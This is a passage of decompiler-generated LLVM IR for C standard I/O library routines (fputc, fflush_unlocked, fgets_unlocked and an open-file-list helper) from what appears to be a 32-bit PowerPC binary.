  br label %dec_label_pc_1001b588

dec_label_pc_1001b588:                            ; preds = %dec_label_pc_1001b564, %dec_label_pc_1001b584
  %v0_1001b58c = phi i32 [ %v4_1001b570, %dec_label_pc_1001b564 ], [ %v0_1001b58c.pre, %dec_label_pc_1001b584 ]
  %v1_1001b5a0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1001b51c)
  ret i32 %v0_1001b58c

; uselistorder directives
  uselistorder i32 %v0_1001b51c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001b588, { 1, 0 }
  uselistorder label %dec_label_pc_1001b564, { 1, 0 }
}

define i32 @__GI_fputc(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v1_1001b5b4 = add i32 %arg2, 56
  store i32 %v1_1001b5b4, i32* %r30.global-to-local, align 4
  store i32 %tmp, i32* @r29, align 4
  %v1_1001b5c8 = add i32 %arg2, 52
  %v2_1001b5c8 = inttoptr i32 %v1_1001b5c8 to i32*
  %v3_1001b5c8 = load i32, i32* %v2_1001b5c8, align 4
  %v3_1001b5cc = icmp eq i32 %v3_1001b5c8, 0
  br i1 %v3_1001b5cc, label %dec_label_pc_1001b604, label %dec_label_pc_1001b5d4

dec_label_pc_1001b5d4:                            ; preds = %entry
  %v1_1001b5d4 = add i32 %arg2, 16
  %v2_1001b5d4 = inttoptr i32 %v1_1001b5d4 to i32*
  %v3_1001b5d4 = load i32, i32* %v2_1001b5d4, align 4
  %v1_1001b5d81 = zext i8 %arg1 to i32
  store i32 %v1_1001b5d81, i32* @r30, align 4
  %v1_1001b5dc = add i32 %arg2, 28
  %v2_1001b5dc = inttoptr i32 %v1_1001b5dc to i32*
  %v3_1001b5dc = load i32, i32* %v2_1001b5dc, align 4
  %v2_1001b5e0 = add i32 %v3_1001b5d4, 1
  store i32 %v2_1001b5e0, i32* %r11.global-to-local, align 4
  %v3_1001b5e4 = icmp ult i32 %v3_1001b5d4, %v3_1001b5dc
  br i1 %v3_1001b5e4, label %dec_label_pc_1001b5ec, label %dec_label_pc_1001b5f8

dec_label_pc_1001b5ec:                            ; preds = %dec_label_pc_1001b5d4
  %v4_1001b5d4 = inttoptr i32 %v3_1001b5d4 to i8*
  store i8 %arg1, i8* %v4_1001b5d4, align 1
  %v0_1001b5f0 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001b5f0, i32* %v2_1001b5d4, align 4
  br label %dec_label_pc_1001b65c

dec_label_pc_1001b5f8:                            ; preds = %dec_label_pc_1001b5d4
  store i32 268547580, i32* @lr, align 4
  %v4_1001b5f8 = trunc i32 %v1_1001b5b4 to i8
  %v5_1001b5f8 = call i32 @putc_unlocked(i8 %v4_1001b5f8, i32 %v3_1001b5d4, i32 %v1_1001b5b4)
  store i32 %v5_1001b5f8, i32* @r30, align 4
  br label %dec_label_pc_1001b65c

dec_label_pc_1001b604:                            ; preds = %entry
  %v2_1001b608 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001b610 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 %v1_1001b5b4)
  %v0_1001b614 = load i32, i32* %r30.global-to-local, align 4
  store i32 268547612, i32* @lr, align 4
  %v1_1001b618 = call i32 @pthread_mutex_lock(i32 %v0_1001b614)
  %v0_1001b61c = load i32, i32* @r31, align 4
  %v1_1001b61c = add i32 %v0_1001b61c, 16
  %v2_1001b61c = inttoptr i32 %v1_1001b61c to i32*
  %v3_1001b61c = load i32, i32* %v2_1001b61c, align 4
  %v1_1001b620 = add i32 %v0_1001b61c, 28
  %v2_1001b620 = inttoptr i32 %v1_1001b620 to i32*
  %v3_1001b620 = load i32, i32* %v2_1001b620, align 4
  %v0_1001b628 = load i32, i32* @r29, align 4
  %v1_1001b628 = urem i32 %v0_1001b628, 256
  store i32 %v1_1001b628, i32* %r30.global-to-local, align 4
  %v2_1001b630 = add i32 %v3_1001b61c, 1
  store i32 %v2_1001b630, i32* %r11.global-to-local, align 4
  %v3_1001b634 = icmp ult i32 %v3_1001b61c, %v3_1001b620
  br i1 %v3_1001b634, label %dec_label_pc_1001b63c, label %dec_label_pc_1001b648

dec_label_pc_1001b63c:                            ; preds = %dec_label_pc_1001b604
  %v4_1001b61c = inttoptr i32 %v3_1001b61c to i8*
  %v1_1001b63c = trunc i32 %v0_1001b628 to i8
  store i8 %v1_1001b63c, i8* %v4_1001b61c, align 1
  %v0_1001b640 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001b640 = load i32, i32* @r31, align 4
  %v2_1001b640 = add i32 %v1_1001b640, 16
  %v3_1001b640 = inttoptr i32 %v2_1001b640 to i32*
  store i32 %v0_1001b640, i32* %v3_1001b640, align 4
  br label %dec_label_pc_1001b650

dec_label_pc_1001b648:                            ; preds = %dec_label_pc_1001b604
  %v1_1001b62c = trunc i32 %v0_1001b628 to i8
  store i32 268547660, i32* @lr, align 4
  %v6_1001b648 = call i32 @putc_unlocked(i8 %v1_1001b62c, i32 %v0_1001b61c, i32 %v3_1001b61c)
  store i32 %v6_1001b648, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001b650

dec_label_pc_1001b650:                            ; preds = %dec_label_pc_1001b63c, %dec_label_pc_1001b648
  store i32 %v2_1001b608, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268547676, i32* @lr, align 4
  %v0_1001b658 = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001b65c

dec_label_pc_1001b65c:                            ; preds = %dec_label_pc_1001b5f8, %dec_label_pc_1001b5ec, %dec_label_pc_1001b650
  %v0_1001b660 = load i32, i32* @r30, align 4
  ret i32 %v0_1001b660

; uselistorder directives
  uselistorder i32 %v0_1001b628, { 2, 1, 0 }
  uselistorder i32 %v3_1001b61c, { 0, 3, 1, 2 }
  uselistorder i32 %v0_1001b61c, { 1, 0, 2 }
  uselistorder i32 %v3_1001b5d4, { 0, 3, 1, 2 }
  uselistorder i32 %v1_1001b5b4, { 0, 2, 1, 3 }
  uselistorder i32 (i8, i32, i32)* @putc_unlocked, { 6, 7, 0, 1, 2, 3, 4, 5, 8, 9 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i8 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001b65c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b650, { 1, 0 }
}

define i32 @_stdio_openlist_dec_use() local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10044d58.1131 to i32), i32* @r29, align 4
  %v2_1001b698 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1001b6a0 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 268527832, i32 ptrtoint (i32* @global_var_10044d58.1131 to i32))
  %v0_1001b6a4 = load i32, i32* @r29, align 4
  store i32 268547756, i32* @lr, align 4
  %v1_1001b6a8 = call i32 @pthread_mutex_lock(i32 %v0_1001b6a4)
  %v3_1001b6b0 = load i32, i32* @global_var_10045218.1132, align 4
  %v3_1001b6b4 = icmp eq i32 %v3_1001b6b0, 1
  br i1 %v3_1001b6b4, label %dec_label_pc_1001b6bc, label %dec_label_pc_1001b764

dec_label_pc_1001b6bc:                            ; preds = %entry
  %v3_1001b6c0 = load i16*, i16** @global_var_1004521c.1133, align 4
  %v2_1001b6c4 = icmp sgt i16* %v3_1001b6c0, null
  br i1 %v2_1001b6c4, label %dec_label_pc_1001b6cc, label %dec_label_pc_1001b764

dec_label_pc_1001b6cc:                            ; preds = %dec_label_pc_1001b6bc
  %v0_1001b6d0 = load i32, i32* @r31, align 4
  %v2_1001b6d8 = ptrtoint i32* %stack_var_-40 to i32
  store i32 0, i32* @r30, align 4
  %v4_1001b6e4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001b6d0, i32 ptrtoint (i32* @global_var_10044d40.1154 to i32))
  store i32 268547824, i32* @lr, align 4
  %v1_1001b6ec = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044d40.1154 to i32))
  %storemerge7 = load i32, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  store i32 %storemerge7, i32* @r29, align 4
  %v3_1001b74410 = icmp eq i32 %storemerge7, 0
  %v0_1001b74811 = load i32, i32* @r30, align 4
  br i1 %v3_1001b74410, label %dec_label_pc_1001b750, label %dec_label_pc_1001b6fc

dec_label_pc_1001b6fc:                            ; preds = %dec_label_pc_1001b6cc, %dec_label_pc_1001b744.backedge
  %v0_1001b74816 = phi i32 [ %v0_1001b748, %dec_label_pc_1001b744.backedge ], [ %v0_1001b74811, %dec_label_pc_1001b6cc ]
  %v3_1001b74817.in = phi i32 [ %v0_1001b748, %dec_label_pc_1001b744.backedge ], [ %v0_1001b74811, %dec_label_pc_1001b6cc ]
  %storemerge15 = phi i32 [ %storemerge, %dec_label_pc_1001b744.backedge ], [ %storemerge7, %dec_label_pc_1001b6cc ]
  %v1_1001b6fc = inttoptr i32 %storemerge15 to i16*
  %v2_1001b6fc = load i16, i16* %v1_1001b6fc, align 2
  %v1_1001b700 = add i32 %storemerge15, 32
  %v2_1001b700 = inttoptr i32 %v1_1001b700 to i32*
  %v3_1001b700 = load i32, i32* %v2_1001b700, align 4
  store i32 %v3_1001b700, i32* @r31, align 4
  %v1_1001b704 = and i16 %v2_1001b6fc, -32720
  %v3_1001b708 = icmp eq i16 %v1_1001b704, 48
  br i1 %v3_1001b708, label %dec_label_pc_1001b718, label %dec_label_pc_1001b710

dec_label_pc_1001b710:                            ; preds = %dec_label_pc_1001b6fc
  store i32 %storemerge15, i32* @r30, align 4
  br label %dec_label_pc_1001b744.backedge

dec_label_pc_1001b718:                            ; preds = %dec_label_pc_1001b6fc
  %v3_1001b74817 = icmp eq i32 %v3_1001b74817.in, 0
  br i1 %v3_1001b74817, label %dec_label_pc_1001b71c, label %dec_label_pc_1001b728

dec_label_pc_1001b71c:                            ; preds = %dec_label_pc_1001b718
  store i32 %v3_1001b700, i32* bitcast (i32** @global_var_10045128.997 to i32*), align 4
  br label %dec_label_pc_1001b72c

dec_label_pc_1001b728:                            ; preds = %dec_label_pc_1001b718
  %v2_1001b728 = add i32 %v0_1001b74816, 32
  %v3_1001b728 = inttoptr i32 %v2_1001b728 to i32*
  store i32 %v3_1001b700, i32* %v3_1001b728, align 4
  %v0_1001b72c.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_1001b72c

dec_label_pc_1001b72c:                            ; preds = %dec_label_pc_1001b71c, %dec_label_pc_1001b728
  %v0_1001b72c = phi i32 [ %storemerge15, %dec_label_pc_1001b71c ], [ %v0_1001b72c.pre, %dec_label_pc_1001b728 ]
  %v1_1001b72c = inttoptr i32 %v0_1001b72c to i16*
  %v2_1001b72c = load i16, i16* %v1_1001b72c, align 2
  store i32 %v0_1001b72c, i32* @r3, align 4
  %v1_1001b734 = and i16 %v2_1001b72c, 8192
  %v3_1001b734 = icmp eq i16 %v1_1001b734, 0
  br i1 %v3_1001b734, label %dec_label_pc_1001b744.backedge, label %dec_label_pc_1001b73c

dec_label_pc_1001b744.backedge:                   ; preds = %dec_label_pc_1001b72c, %dec_label_pc_1001b710, %dec_label_pc_1001b73c
  %storemerge = load i32, i32* @r31, align 4
  store i32 %storemerge, i32* @r29, align 4
  %v3_1001b744 = icmp eq i32 %storemerge, 0
  %v0_1001b748 = load i32, i32* @r30, align 4
  br i1 %v3_1001b744, label %dec_label_pc_1001b750, label %dec_label_pc_1001b6fc

dec_label_pc_1001b73c:                            ; preds = %dec_label_pc_1001b72c
  store i32 268547904, i32* @lr, align 4
  %v0_1001b73c = call i32 @free()
  br label %dec_label_pc_1001b744.backedge

dec_label_pc_1001b750:                            ; preds = %dec_label_pc_1001b744.backedge, %dec_label_pc_1001b6cc
  store i32 %v2_1001b6d8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268547932, i32* @lr, align 4
  %v0_1001b758 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b760 = load i32, i32* @r29, align 4
  %v4_1001b760 = inttoptr i32 %v0_1001b760 to i16*
  store i16* %v4_1001b760, i16** @global_var_1004521c.1133, align 4
  %v3_1001b76c.pre = load i32, i32* @global_var_10045218.1132, align 4
  br label %dec_label_pc_1001b764

dec_label_pc_1001b764:                            ; preds = %dec_label_pc_1001b6bc, %entry, %dec_label_pc_1001b750
  %v3_1001b76c = phi i32 [ 1, %dec_label_pc_1001b6bc ], [ %v3_1001b6b0, %entry ], [ %v3_1001b76c.pre, %dec_label_pc_1001b750 ]
  store i32 %v2_1001b698, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  %v1_1001b774 = add i32 %v3_1001b76c, -1
  store i32 %v1_1001b774, i32* @global_var_10045218.1132, align 4
  store i32 268547968, i32* @lr, align 4
  %v0_1001b77c = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1001b77c

; uselistorder directives
  uselistorder i32 %v0_1001b748, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1001b72c, { 1, 0 }
  uselistorder i32 %v3_1001b700, { 1, 0, 2 }
  uselistorder i32 %storemerge15, { 3, 2, 0, 1 }
  uselistorder i32* bitcast (i32** @global_var_10045128.997 to i32*), { 4, 0, 1, 2, 5, 6, 3, 7 }
  uselistorder i16** @global_var_1004521c.1133, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b764, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b744.backedge, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b72c, { 1, 0 }
  uselistorder label %dec_label_pc_1001b6fc, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32** @global_var_10045128.997 to i32), i32* %r9.global-to-local, align 4
  %v5_1001b7a4 = icmp eq i16* %arg1, bitcast (i32** @global_var_10045128.997 to i16*)
  store i32 %tmp, i32* @r29, align 4
  store i32 0, i32* @r27, align 4
  br i1 %v5_1001b7a4, label %dec_label_pc_1001b7c8, label %dec_label_pc_1001b7bc

dec_label_pc_1001b7bc:                            ; preds = %entry
  %v4_1001b7bc = icmp eq i16* %arg1, null
  store i32 256, i32* @r27, align 4
  br i1 %v4_1001b7bc, label %dec_label_pc_1001b7c8, label %dec_label_pc_1001b8f4

dec_label_pc_1001b7c8:                            ; preds = %dec_label_pc_1001b7bc, %entry
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v2_1001b7d4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 ptrtoint (i32* @global_var_10044d58.1131 to i32), i32* %r29.global-to-local, align 4
  %v4_1001b7e8 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 268527832, i32 ptrtoint (i32* @global_var_10044d58.1131 to i32))
  store i32 268548084, i32* @lr, align 4
  %v1_1001b7f0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044d58.1131 to i32))
  %v3_1001b7f8 = load i32, i32* @global_var_10045218.1132, align 4
  store i32 %v2_1001b7d4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10044d40.1154 to i32), i32* %r29.global-to-local, align 4
  %v1_1001b80c = add i32 %v3_1001b7f8, 1
  store i32 %v1_1001b80c, i32* %r9.global-to-local, align 4
  store i32 %v1_1001b80c, i32* @global_var_10045218.1132, align 4
  store i32 268548120, i32* @lr, align 4
  %v0_1001b814 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b818 = load i32, i32* @r30, align 4
  %v0_1001b81c = load i32, i32* %r29.global-to-local, align 4
  %v4_1001b824 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001b818, i32 %v0_1001b81c)
  store i32 268548144, i32* @lr, align 4
  %v1_1001b82c = call i32 @pthread_mutex_lock(i32 %v0_1001b81c)
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v2_1001b7d4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_1001b848.1179 to i32), i32* @lr, align 4
  %v0_1001b844 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001b8e4.pr = load i32, i32* @r31, align 4
  %v3_1001b8e43 = icmp eq i32 %v0_1001b8e4.pr, 0
  br i1 %v3_1001b8e43, label %dec_label_pc_1001b8ec, label %dec_label_pc_1001b84c

dec_label_pc_1001b84c:                            ; preds = %dec_label_pc_1001b7c8, %dec_label_pc_1001b8e0
  %v0_1001b868 = phi i32 [ %v3_1001b8e0, %dec_label_pc_1001b8e0 ], [ %v0_1001b8e4.pr, %dec_label_pc_1001b7c8 ]
  %v1_1001b84c = inttoptr i32 %v0_1001b868 to i16*
  %v2_1001b84c = load i16, i16* %v1_1001b84c, align 2
  %v3_1001b84c = zext i16 %v2_1001b84c to i32
  %v1_1001b850 = and i32 %v3_1001b84c, 64
  store i32 %v1_1001b850, i32* %r9.global-to-local, align 4
  %v3_1001b850 = icmp eq i32 %v1_1001b850, 0
  br i1 %v3_1001b850, label %dec_label_pc_1001b8e0, label %dec_label_pc_1001b858

dec_label_pc_1001b858:                            ; preds = %dec_label_pc_1001b84c
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001b85c = load i32, i32* @global_var_1004512c.998, align 4
  %v3_1001b860 = icmp eq i32 %v3_1001b85c, 2
  br i1 %v3_1001b860, label %dec_label_pc_1001b884, label %dec_label_pc_1001b868

dec_label_pc_1001b868:                            ; preds = %dec_label_pc_1001b858
  %v1_1001b868 = add i32 %v0_1001b868, 56
  store i32 %v1_1001b868, i32* %r29.global-to-local, align 4
  %v0_1001b870 = load i32, i32* @r30, align 4
  %v4_1001b878 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 %v0_1001b870, i32 %v1_1001b868)
  store i32 268548228, i32* @lr, align 4
  %v1_1001b880 = call i32 @pthread_mutex_lock(i32 %v1_1001b868)
  %v0_1001b884.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1001b884

dec_label_pc_1001b884:                            ; preds = %dec_label_pc_1001b858, %dec_label_pc_1001b868
  %v0_1001b898 = phi i32 [ %v0_1001b868, %dec_label_pc_1001b858 ], [ %v0_1001b884.pre, %dec_label_pc_1001b868 ]
  %v1_1001b884 = inttoptr i32 %v0_1001b898 to i16*
  %v2_1001b884 = load i16, i16* %v1_1001b884, align 2
  %v3_1001b884 = zext i16 %v2_1001b884 to i32
  %v0_1001b888 = load i32, i32* @r27, align 4
  %v2_1001b888 = or i32 %v0_1001b888, %v3_1001b884
  %v1_1001b88c = and i32 %v2_1001b888, 832
  %v1_1001b890 = xor i32 %v1_1001b88c, 320
  store i32 %v1_1001b890, i32* %r9.global-to-local, align 4
  %v3_1001b890 = icmp eq i32 %v1_1001b890, 0
  br i1 %v3_1001b890, label %dec_label_pc_1001b898, label %dec_label_pc_1001b8c4

dec_label_pc_1001b898:                            ; preds = %dec_label_pc_1001b884
  store i32 %v0_1001b898, i32* @r3, align 4
  store i32 268548256, i32* @lr, align 4
  %v0_1001b89c = call i32 @__stdio_wcommit()
  %v3_1001b8a0 = icmp eq i32 %v0_1001b89c, 0
  br i1 %v3_1001b8a0, label %dec_label_pc_1001b8b0, label %dec_label_pc_1001b8a8

dec_label_pc_1001b8a8:                            ; preds = %dec_label_pc_1001b898
  store i32 -1, i32* @r28, align 4
  br label %dec_label_pc_1001b8c4

dec_label_pc_1001b8b0:                            ; preds = %dec_label_pc_1001b898
  %v0_1001b8b0 = load i32, i32* @r31, align 4
  %v1_1001b8b0 = inttoptr i32 %v0_1001b8b0 to i16*
  %v2_1001b8b0 = load i16, i16* %v1_1001b8b0, align 2
  %v3_1001b8b0 = zext i16 %v2_1001b8b0 to i32
  %v1_1001b8b4 = add i32 %v0_1001b8b0, 8
  %v2_1001b8b4 = inttoptr i32 %v1_1001b8b4 to i32*
  %v3_1001b8b4 = load i32, i32* %v2_1001b8b4, align 4
  store i32 %v3_1001b8b4, i32* %r9.global-to-local, align 4
  %v1_1001b8b8 = call i32 @__asm_rlwinm(i32 %v3_1001b8b0, i32 0, i32 26, i32 24)
  %v2_1001b8b8 = trunc i32 %v1_1001b8b8 to i16
  %v1_1001b8bc = load i32, i32* @r31, align 4
  %v2_1001b8bc = add i32 %v1_1001b8bc, 28
  %v3_1001b8bc = inttoptr i32 %v2_1001b8bc to i32*
  store i32 %v3_1001b8b4, i32* %v3_1001b8bc, align 4
  %v3_1001b8c0 = load i32, i32* @r31, align 4
  %v4_1001b8c0 = inttoptr i32 %v3_1001b8c0 to i16*
  store i16 %v2_1001b8b8, i16* %v4_1001b8c0, align 2
  br label %dec_label_pc_1001b8c4

dec_label_pc_1001b8c4:                            ; preds = %dec_label_pc_1001b884, %dec_label_pc_1001b8a8, %dec_label_pc_1001b8b0
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_1001b8c8 = load i32, i32* @global_var_1004512c.998, align 4
  %v3_1001b8cc = icmp eq i32 %v3_1001b8c8, 2
  br i1 %v3_1001b8cc, label %dec_label_pc_1001b8e0, label %dec_label_pc_1001b8d4

dec_label_pc_1001b8d4:                            ; preds = %dec_label_pc_1001b8c4
  store i32 %v2_1001b7d4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268548320, i32* @lr, align 4
  %v0_1001b8dc = call i32 @__pthread_cleanup_pop_restore()
  br label %dec_label_pc_1001b8e0

dec_label_pc_1001b8e0:                            ; preds = %dec_label_pc_1001b8c4, %dec_label_pc_1001b84c, %dec_label_pc_1001b8d4
  %v0_1001b8e0 = load i32, i32* @r31, align 4
  %v1_1001b8e0 = add i32 %v0_1001b8e0, 32
  %v2_1001b8e0 = inttoptr i32 %v1_1001b8e0 to i32*
  %v3_1001b8e0 = load i32, i32* %v2_1001b8e0, align 4
  store i32 %v3_1001b8e0, i32* @r31, align 4
  %v3_1001b8e4 = icmp eq i32 %v3_1001b8e0, 0
  br i1 %v3_1001b8e4, label %dec_label_pc_1001b8ec, label %dec_label_pc_1001b84c

dec_label_pc_1001b8ec:                            ; preds = %dec_label_pc_1001b8e0, %dec_label_pc_1001b7c8
  store i32 ptrtoint (i32* @global_var_1001b8f0.1180 to i32), i32* @lr, align 4
  %v0_1001b8ec = call i32 @_stdio_openlist_dec_use()
  br label %dec_label_pc_1001b92c

dec_label_pc_1001b8f4:                            ; preds = %dec_label_pc_1001b7bc
  %v3_1001b8f4 = load i16, i16* %arg1, align 2
  %v4_1001b8f4 = zext i16 %v3_1001b8f4 to i32
  store i32 0, i32* @r28, align 4
  %v1_1001b8fc = and i32 %v4_1001b8f4, 64
  store i32 %v1_1001b8fc, i32* %r9.global-to-local, align 4
  %v3_1001b8fc = icmp eq i32 %v1_1001b8fc, 0
  br i1 %v3_1001b8fc, label %dec_label_pc_1001b92c, label %dec_label_pc_1001b904

dec_label_pc_1001b904:                            ; preds = %dec_label_pc_1001b8f4
  store i32 268548360, i32* @lr, align 4
  %v0_1001b904 = call i32 @__stdio_wcommit()
  store i32 -1, i32* @r28, align 4
  %v3_1001b90c = icmp eq i32 %v0_1001b904, 0
  br i1 %v3_1001b90c, label %dec_label_pc_1001b914, label %dec_label_pc_1001b92c

dec_label_pc_1001b914:                            ; preds = %dec_label_pc_1001b904
  %v0_1001b914 = load i32, i32* @r29, align 4
  %v1_1001b914 = inttoptr i32 %v0_1001b914 to i16*
  %v2_1001b914 = load i16, i16* %v1_1001b914, align 2
  %v3_1001b914 = zext i16 %v2_1001b914 to i32
  store i32 0, i32* @r28, align 4
  %v1_1001b91c = add i32 %v0_1001b914, 8
  %v2_1001b91c = inttoptr i32 %v1_1001b91c to i32*
  %v3_1001b91c = load i32, i32* %v2_1001b91c, align 4
  store i32 %v3_1001b91c, i32* %r9.global-to-local, align 4
  %v1_1001b920 = call i32 @__asm_rlwinm(i32 %v3_1001b914, i32 0, i32 26, i32 24)
  %v2_1001b920 = trunc i32 %v1_1001b920 to i16
  %v3_1001b924 = load i32, i32* @r29, align 4
  %v4_1001b924 = inttoptr i32 %v3_1001b924 to i16*
  store i16 %v2_1001b920, i16* %v4_1001b924, align 2
  %v0_1001b928 = load i32, i32* %r9.global-to-local, align 4
  %v1_1001b928 = load i32, i32* @r29, align 4
  %v2_1001b928 = add i32 %v1_1001b928, 28
  %v3_1001b928 = inttoptr i32 %v2_1001b928 to i32*
  store i32 %v0_1001b928, i32* %v3_1001b928, align 4
  br label %dec_label_pc_1001b92c

dec_label_pc_1001b92c:                            ; preds = %dec_label_pc_1001b904, %dec_label_pc_1001b8f4, %dec_label_pc_1001b8ec, %dec_label_pc_1001b914
  %v0_1001b930 = load i32, i32* @r28, align 4
  ret i32 %v0_1001b930

; uselistorder directives
  uselistorder i32 %v3_1001b8e0, { 1, 2, 0 }
  uselistorder i32 %v1_1001b890, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11 }
  uselistorder i32 ()* @_stdio_openlist_dec_use, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10044d40.1154 to i32), { 2, 0, 1, 3, 4 }
  uselistorder i32* @global_var_10045218.1132, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_10044d58.1131 to i32), { 0, 3, 6, 2, 7, 8, 1, 4, 9, 5, 10 }
  uselistorder i16* %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1001b92c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1001b8e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001b8c4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001b884, { 1, 0 }
  uselistorder label %dec_label_pc_1001b84c, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cr6_eq.global-to-local = alloca i1, align 1
  %cr7_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* @r29, align 4
  store i32 %tmp, i32* @r28, align 4
  store i32 %arg3, i32* @r30, align 4
  %tmp19 = icmp slt i32 %arg2, 1
  br i1 %tmp19, label %dec_label_pc_1001b9ec, label %dec_label_pc_1001b964

dec_label_pc_1001b964:                            ; preds = %entry
  store i32 %tmp, i32* @r31, align 4
  %v2_1001b9cc3 = add i32 %arg2, -1
  store i32 %v2_1001b9cc3, i32* @r29, align 4
  %v4_1001b9d49 = icmp eq i32 %arg2, 1
  br i1 %v4_1001b9d49, label %dec_label_pc_1001b9d8, label %dec_label_pc_1001b96c

dec_label_pc_1001b96c:                            ; preds = %dec_label_pc_1001b964, %dec_label_pc_1001b9cc.backedge
  %v2_1001b988 = phi i32 [ %v2_1001b98812, %dec_label_pc_1001b9cc.backedge ], [ %tmp, %dec_label_pc_1001b964 ]
  %v0_1001b96c = phi i32 [ %v0_1001b9d0, %dec_label_pc_1001b9cc.backedge ], [ %arg3, %dec_label_pc_1001b964 ]
  %v1_1001b96c = add i32 %v0_1001b96c, 16
  %v2_1001b96c = inttoptr i32 %v1_1001b96c to i32*
  %v3_1001b96c = load i32, i32* %v2_1001b96c, align 4
  %v1_1001b970 = add i32 %v0_1001b96c, 24
  %v2_1001b970 = inttoptr i32 %v1_1001b970 to i32*
  %v3_1001b970 = load i32, i32* %v2_1001b970, align 4
  %v2_1001b974 = add i32 %v3_1001b96c, 1
  store i32 %v2_1001b974, i32* %r11.global-to-local, align 4
  %v3_1001b978 = icmp ult i32 %v3_1001b96c, %v3_1001b970
  %v5_1001b978 = icmp eq i32 %v3_1001b96c, %v3_1001b970
  store i1 %v5_1001b978, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1001b978, label %dec_label_pc_1001b980, label %dec_label_pc_1001b99c

dec_label_pc_1001b980:                            ; preds = %dec_label_pc_1001b96c
  %v4_1001b96c = inttoptr i32 %v3_1001b96c to i8*
  %v3_1001b980 = load i8, i8* %v4_1001b96c, align 1
  %v3_1001b984 = icmp eq i8 %v3_1001b980, 10
  store i1 %v3_1001b984, i1* %cr7_eq.global-to-local, align 1
  %v3_1001b988 = inttoptr i32 %v2_1001b988 to i8*
  store i8 %v3_1001b980, i8* %v3_1001b988, align 1
  %v0_1001b98c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001b98c = load i32, i32* @r30, align 4
  %v2_1001b98c = add i32 %v1_1001b98c, 16
  %v3_1001b98c = inttoptr i32 %v2_1001b98c to i32*
  store i32 %v0_1001b98c, i32* %v3_1001b98c, align 4
  %v0_1001b990 = load i32, i32* @r31, align 4
  %v1_1001b990 = add i32 %v0_1001b990, 1
  store i32 %v1_1001b990, i32* @r31, align 4
  %v0_1001b994 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1001b994, label %dec_label_pc_1001b9d8, label %dec_label_pc_1001b9cc.backedge

dec_label_pc_1001b99c:                            ; preds = %dec_label_pc_1001b96c
  %v1_1001b9d010 = inttoptr i32 %v0_1001b96c to i16*
  store i32 268548512, i32* @lr, align 4
